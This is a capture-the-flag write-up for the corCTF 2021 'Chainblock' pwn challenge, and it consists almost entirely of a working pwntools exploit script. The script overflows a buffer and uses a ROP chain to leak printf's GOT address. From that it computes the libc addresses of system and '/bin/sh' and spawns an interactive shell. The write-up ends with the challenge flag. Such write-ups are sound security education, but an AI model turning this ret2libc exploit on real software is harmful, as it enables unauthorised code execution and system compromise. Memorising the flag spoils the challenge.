---
name: Chainblock (2021)
event: Crusaders of Rust (cor) CTF 2021
category: Pwn
description: Writeup for Chainblock (Pwn) - Crusaders of Rust (cor) CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Chainblock

## Challenge Description

> I made a chain of blocks!

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('Please enter your name: ', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break system
continue
'''.format(**locals())

# Binary filename
exe = './chainblock'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(1000))

# Start program
io = start()

pop_rdi = 0x401493
ret = 0x40101a

# Build the payload
payload = flat({
    offset: [
        pop_rdi,
        elf.got.printf,
        elf.plt.puts,
        elf.symbols.verify
    ]
})

# Send the payload
io.sendlineafter('Please enter your name: ', payload)

# Grab leaked lib-c address (puts)
io.recvuntil('wrong identity!\n')
got_printf = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("got_printf: %#x", got_printf)

# Subtract puts offset to get libc base
libc_base = got_printf - 0x5f660
info("libc_base: %#x", libc_base)

# Add offsets to get system() and "/bin/sh" addresses
system_addr = libc_base + 0x4fa60
info("system_addr: %#x", system_addr)
bin_sh = libc_base + 0x1abf05
info("bin_sh: %#x", bin_sh)

# Payload to get shell
payload = flat({
    offset: [
        pop_rdi,
        bin_sh,
        ret,  # Alignment
        system_addr,
    ]
})

# Send the payload
io.sendline(payload)

# Got Shell?
io.interactive()
```
{% endcode %}

Flag: `corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}`
